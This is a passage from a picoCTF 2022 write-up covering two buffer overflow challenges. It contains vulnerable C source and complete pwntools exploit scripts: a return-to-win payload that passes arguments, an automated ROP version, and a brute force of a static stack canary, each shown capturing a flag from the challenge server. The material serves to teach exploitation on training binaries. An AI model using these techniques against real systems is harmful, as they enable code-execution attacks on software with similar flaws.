  <b>Authors</b>: Sanjay C., Palash Oswal
  <details><summary><b>Hints:</b></summary><br>1. Try using GDB to print out the stack once you write to it.</details>
</div>

<div class="text-warning">
<i class="fa-solid fa-triangle-exclamation"></i> Warning: This is an <b>instance-based</b> challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.
</div>

<figure class="highlight console">
  <figcaption><span>checksec.sh</span><a target="_blank" rel="noopener"
      href="https://github.com/slimm609/checksec.sh"><span style="color:#82C4E4">[github link]</span></a></figcaption>
<table><tr><td class="code"><pre><span class="meta prompt_">$ </span>checksec vuln
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
    Arch:     i386-32-little
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#5EBDAB">NX enabled</span>
    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
</pre></td></tr></table></figure>

Let's check out our source code:

{% codeblock vuln-2.c lang:c https://enscribe.dev/asset/pico22/buffer-overflow/vuln-2.c <span style="color:#82C4E4">[download source]</span> %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
{% endcodeblock %}

Looking at the `win()` function, we can see that two arguments are required that need to be passed into the function to receive the flag. Two guard clauses lay above the flag print:

{% codeblock lang:c first_line:19 %}
  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
{% endcodeblock %}

The goal is simple: call `win(0xCAFEF00D, 0xF00DF00D)`! We'll be doing it the hard way (for a learning experience), in addition to a more advanced easy way. Let's get started.

### Part I: The Hard Way

We can apply a lot from what we learned in `Buffer overflow 1`. The first thing we should do is find the offset, which requires no hassle with pwntools helpers! Although we'll get actual number here, I won't include it in the final script for the sake of not leaving out any steps. Simply segfault the process with a cyclic string, read the core dump's fault address (`$eip`) and throw it into `cyclic_find()`:

<figure class="highlight plaintext"> <table> <tr> <td class="code"><pre style="white-space: pre-wrap"><span class="meta prompt_">$ </span>python3 -q
<span class="meta prompt_">>>> </span>from pwn import *
<span class="meta prompt_">>>> </span>elf = context.binary = ELF(&apos;./vuln&apos;)
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
    Arch:     i386-32-little
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#5EBDAB">NX enabled</span>
    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
<span class="meta prompt_">>>> </span>p = process(elf.path)
[<span style="color:#9755B3">x</span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 2777
<span class="meta prompt_">>>> </span>p.sendline(cyclic(128))
<span class="meta prompt_">>>> </span>p.wait()
[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code -11 (SIGSEGV) (pid 2777)
<span class="meta prompt_">>>> </span>core = Corefile(&apos;./core&apos;)
[<span style="color:#9755B3">x</span>] Parsing corefile...
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
    Arch:      i386-32-little
    EIP:       0x62616164
    ESP:       0xffafca40
    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
    Fault:     0x62616164
[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
<span class="meta prompt_">>>> </span>cyclic_find(0x62616164)
112
</pre></td></tr></table></figure>

The next thing we need to know about is the way functions are laid out on the stack. Let's recall the diagram I drew out earlier:

![Stack Diagram](asset/pico22/buffer-overflow/stack-visual2.png)

If we want to call a function with parameters, we'll need to include the base pointer alongside a return address, which can simply be `main()`. With this, we can basically copy our script over from `Buffer overflow 1` with a few tweaks to the payload:

{% codeblock buffer-overflow-2.py lang:py https://gist.github.com/jktrn/c6c17fc63ca801d0b64d8bb5acc982c1 <span style="color:#82C4E4">[github gist link]</span> %}
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)    # sets elf object
host, port = 'saturn.picoctf.net', [PORT]

p = process(elf.path)        # creates local process w/ elf object
p.sendline(cyclic(128))      # sends cyclic pattern to crash
p.wait()                     # sigsegv generates core dump
core = Coredump('./core')    # parses core dump file

payload = flat([
    {cyclic_find(core.eip): elf.symbols.win},    # pads win address
    elf.symbols.main,                            # return address
    0xCAFEF00D,                                  # parameter 1
    0xF00DF00D                                   # parameter 2
])

if args.REMOTE:
    p = remote(host, port)
else:
    p = process(elf.path)

p.sendline(payload)
p.interactive()
{% endcodeblock %}

Let's run it on the remote server:

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>python3 buffer-overflow-2.py REMOTE
[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 3988
[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code
-11 (SIGSEGV) (pid 3988)
[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
    Arch:      i386-32-little
    EIP:       0x62616164
    ESP:       0xffca3290
    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
    Fault:     0x62616164
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
Please enter your string: 
\xf0\xfe\xcadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua-<br>aaavaaawaaaxaaayaaazaabbaabcaab\x96\x92\x04r\x93\x04
picoCTF{argum3nt5_4_d4yZ_<span style="color:#696969"><b>[REDACTED]</b></span>}
</pre></td></tr></table></figure>

### Part II: The Easy Way

But... what if you wanted to be an even **more** lazy pwner? Well, you're in luck, because I present to you: the **[pwntools ROP object](https://docs.pwntools.com/en/stable/rop/rop.html)**! By throwing our elf object into `ROP()` it transforms, and we can use it to automatically call functions and build chains! Here it is in action:

{% codeblock buffer-overflow-2-automated.py lang:py https://gist.github.com/jktrn/a5bfe03bdf5b2d766ef5fa402e9e35d6 <span style="color:#82C4E4">[github gist link]</span> %}
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./vuln' checksec=False)    # sets elf object
rop = ROP(elf)                                         # creates ROP object
host, port = 'saturn.picoctf.net', [PORT]

p = process(elf.path)        # creates local process w/ elf object
p.sendline(cyclic(128))      # sends cyclic pattern to crash
p.wait()                     # sigsegv generates core dump
core = Coredump('./core')    # parses core dump file

rop.win(0xCAFEF00D, 0xF00DF00D)                        # Call win() with args
payload = fit({cyclic_find(core.eip): rop.chain()})    # pad ROP chain

if args.REMOTE:
    p = remote(host, port)
else:
    p = process(elf.path)

p.sendline(payload)
p.interactive()
{% endcodeblock %}

Let's run it on the remote server:

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>python3 buffer-overflow-2-automated.py REMOTE
[<span style="color:#277FFF"><b>*</b></span>] Loaded 10 cached gadgets for &apos;./vuln&apos;
[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 4993
[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code
-11 (SIGSEGV) (pid 4993)
[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
    Arch:      i386-32-little
    EIP:       0x62616164
    ESP:       0xffd07fc0
    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
    Fault:     0x62616164
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaa-
avaaawaaaxaaayaaazaabbaabcaab\x96\x\xf0\xfe\xca
picoCTF{argum3nt5_4_d4yZ_<span style="color:#696969"><b>[REDACTED]</b></span>}<span style="color:#EC0101"><b>$</b></span> [<span style="color:#277FFF"><b>*</b></span>] Got EOF while reading in interactive
</pre></td></tr></table></figure>

We've successfully called a function with arguments through buffer overflow!

---

## Buffer overflow 3

<div class="box no-highlight">
  Do you think you can bypass the protection and get the flag?<br>
  It looks like Dr. Oswal added a stack canary to this <a href="/asset/pico22/buffer-overflow/vuln-3">program</a> to protect against buffer overflows. You can view source
  <a href="/asset/pico22/buffer-overflow/vuln-3.c">here</a>. And connect with it using:<br>
  <code>nc saturn.picoctf.net [PORT]</code>
  <br><br>
  <b>Authors</b>: Sanjay C., Palash Oswal
  <details>
    <summary><b>Hint:</b></summary><br>1. Maybe there's a smart way to brute-force the canary?
  </details>
</div>

<div class="text-warning">
  <i class="fa-solid fa-triangle-exclamation"></i> Warning: This is an <b>instance-based</b> challenge. Port info will
  be redacted alongside the last eight characters of the flag, as they are dynamic.
</div>

<figure class="highlight console">
  <figcaption><span>checksec.sh</span><a target="_blank" rel="noopener"
      href="https://github.com/slimm609/checksec.sh"><span style="color:#82C4E4">[github link]</span></a></figcaption>
<table><tr><td class="code"><pre><span class="meta prompt_">$ </span>checksec vuln
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;
    Arch:     i386-32-little
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#5EBDAB">NX enabled</span>
    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
</pre></td></tr></table></figure>

So, Dr. Oswal apparently implemented a [stack canary](https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/), which is just a **dynamic value** appended to binaries during compilation. It helps detect and mitigate stack smashing attacks, and programs can terminate if they detect the canary being overwritten. Yet, `checksec` didn't find a canary. That's a bit suspicious... but let's check out our source code first:

<div style="height:700px; overflow:auto; margin-top:15px; margin-bottom:15px;"><figure class="highlight c" style="margin-top:-10px;"><figcaption style="margin-top:5px;"><span>vuln-3.c</span><a href="https://enscribe.dev/asset/pico22/buffer-overflow/vuln-3.c"><span style=color:#82C4E4>[download source]</span></a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CANARY_SIZE 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[FLAGSIZE];</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(buf,FLAGSIZE,f); <span class="comment">// size bound read</span></span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> global_canary[CANARY_SIZE];</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_canary</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;canary.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;canary.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging canary.\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fread(global_canary,<span class="keyword">sizeof</span>(<span class="type">char</span>),CANARY_SIZE,f);</span><br><span class="line">  fclose(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="type">char</span> canary[CANARY_SIZE];</span><br><span class="line">   <span class="type">char</span> buf[BUFSIZE];</span><br><span class="line">   <span class="type">char</span> length[BUFSIZE];</span><br><span class="line">   <span class="type">int</span> count;</span><br><span class="line">   <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">   <span class="built_in">memcpy</span>(canary,global_canary,CANARY_SIZE);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;How Many Bytes will You Write Into the Buffer?\n&gt; &quot;</span>);</span><br><span class="line">   <span class="keyword">while</span> (x&lt;BUFSIZE) &#123;</span><br><span class="line">      read(<span class="number">0</span>,length+x,<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (length[x]==<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">      x++;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">sscanf</span>(length,<span class="string">&quot;%d&quot;</span>,&amp;count);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Input&gt; &quot;</span>);</span><br><span class="line">   read(<span class="number">0</span>,buf,count);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">memcmp</span>(canary,global_canary,CANARY_SIZE)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;***** Stack Smashing Detected ***** : Canary Value Corrupt!\n&quot;</span>);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Ok... Now Where&#x27;s the Flag?\n&quot;</span>);</span><br><span class="line">   fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="comment">// this prevents /bin/sh from dropping the privileges</span></span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  read_canary();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

If you look closely, you might be able to see why `checksec` didn't find a stack canary. That's because it's actually a static variable, being read from a `canary.txt` on the host machine. Canaries that aren't implemented by the compiler are not really canaries!

Knowing that the canary will be four bytes long (defined by `CANARY_SIZE`) and immediately after the 64-byte buffer (defined by `BUFSIZE`), we can write a brute forcing script that can determine the correct canary with a simple trick: **by not fully overwriting the canary the entire time!** Check out this segment of source code:

{% codeblock lang:c first_line:60  %}
   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n");
      fflush(stdout);
      exit(-1);
   }
{% endcodeblock %}

This uses `memcmp()` to determine if the current canary is the same as the global canary. If it's different, then the program will run `exit(-1)`, which is a really weird/invalid exit code and supposedly represents "[abnormal termination](https://softwareengineering.stackexchange.com/questions/314563/where-did-exit-1-come-from)":

<img src="/asset/pico22/buffer-overflow/memcmp1.png" style="border-radius:5px; margin-top:15px; margin-bottom:15px;">

However, if we theoretically overwrite the canary with a single correct byte, `memcmp()` won't detect anything!:

<img src="/asset/pico22/buffer-overflow/memcmp2.png" style="border-radius:5px; margin-top:15px; margin-bottom:15px;">

We can now start writing our script! My plan is to loop through all printable characters for each canary byte, which can be imported from `string`. Let's include that in our pwn boilerplate alongside a simple function that allows us to swap between a local and remote instance:

```py
#!/usr/bin/env python3
from pwn import *
from string import printable

elf = context.binary = ELF("./vuln", checksec=False) # Creates ELF object
host, port = "saturn.picoctf.net", [PORT]
offset = 64

def new_process(): # Specify remote or local instance with CLI argument
    if args.LOCAL:
        return process(elf.path)
    else:
        return remote(host, port)
```

Here's the big part: the `get_canary()` function. I'll be using [`pwnlib.log`](https://docs.pwntools.com/en/stable/log.html) for some spicy status messages. My general process for the brute force is visualized here if you're having trouble:

<img src="/asset/pico22/buffer-overflow/brute-visual.png" style="border-radius:5px; margin-top:15px; margin-bottom:15px;">

I'll be initially sending 64 + 1 bytes, and slowly appending the correct canary to the end of my payload until the loop has completed four times:

{% codeblock lang:py first_line:15 %}
def get_canary():
    canary = b""
    logger = log.progress("Finding canary...")
    for i in range(1, 5):
        for char in printable:
            with context.quiet: # Hides any other log
                p = new_process()
                p.sendlineafter(b"> ", str(offset + i).encode())
                p.sendlineafter(b"> ", flat([{offset: canary}, char.encode()]))
                output = p.recvall()
                if b"?" in output: # If program doesn't crash
                    canary += char.encode()
                    logger.status(f'"{canary.decode()}"')
                    break
    logger.success(f'"{canary.decode()}"')
    return canary
{% endcodeblock %}

The final thing we need to figure out is the offset between the canary to `$eip`, the pointer register, which we will repopulate with the address of `win()`. We can do this by appending a cyclic pattern to the end of our current payload (64 + 4 canary bytes) and reading the Corefile's crash location, which will be the `$eip`:

(Note: My canary is "abcd" because I put that in my `canary.txt`. It will be different on the remote!)

<figure class="highlight plaintext">
    <table>
        <tr>
            <td class="code">
                <pre style="white-space:pre-wrap"><span class="meta prompt_">$ </span>python3 -q
<span class="meta prompt_">>>></span> from pwn import *
<span class="meta prompt_">>>></span> p = process('./vuln')
[<span style="color:#9755B3">x</span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;
[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;: pid 1493
<span class="meta prompt_">>>></span> payload = cyclic(64) + b&apos;abcd&apos; + cyclic(128)
<span class="meta prompt_">>>></span> p.sendline(b&apos;196&apos;)
<span class="meta prompt_">>>></span> p.sendline(payload)
<span class="meta prompt_">>>></span> p.wait()
[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos; stopped with exit code -11 (SIGSEGV) (pid 1493)
<span class="meta prompt_">>>></span> core = Corefile(&apos;./core&apos;)
[<span style="color:#9755B3">x</span>] Parsing corefile...
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-3/core&apos;
    Arch:      i386-32-little
    EIP:       0x61616165
    ESP:       0xffa06160
    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos; (0x8048000)
    Fault:     0x61616165
[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
<span class="meta prompt_">>>></span> cyclic_find(0x61616165)
16
</pre>
            </td>
        </tr>
    </table>
</figure>

The offset is 16, so we'll have to append that amount of bytes to the payload followed by the address of `win()`. I'll combine all sections of our payload together with `flat()`, and then hopefully read the flag from the output:

{% codeblock lang:py first_line:32 %}
canary = get_canary()
p = new_process()
payload = flat([{offset: canary}, {16: elf.symbols.win}])
p.sendlineafter(b"> ", str(len(payload)).encode())
p.sendlineafter(b"> ", payload)
log.success(p.recvall().decode("ISO-8859-1")) # recvallS() didn't work :(
{% endcodeblock %}

Since I segmented my script into parts, I decided against putting a giant codeblock here with the same code as earlier. Instead, I just put it on a [Gist](https://gist.github.com/jktrn/bafbc08bbee179588207e3e3caffde75)! Anyways, here's the full script in action:

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>python3 buffer-overflow-3.py
[<span style="color:#47D4B9"><b>+</b></span>] Finding canary: 'BiRd'
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port 57427: Done
[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (162B)
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to saturn.picoctf.net port 57427
[<span style="color:#47D4B9"><b>+</b></span>] aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaBiRdraaasaaataa-
auaaa6^H
    Ok... Now Where&apos;s the Flag?
    picoCTF{Stat1C_c4n4r13s_4R3_b4D_<span style="color:#696969"><b>[REDACTED]</b></span>}
</pre></td></tr></table></figure>

We've successfully performed a brute force on a vulnerable static canary!

<a href="https://info.flagcounter.com/8Xkk"><img src="https://s01.flagcounter.com/count2/8Xkk/bg_212326/txt_C9CACC/border_C9CACC/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/" alt="Free counters!" border="0"></a>
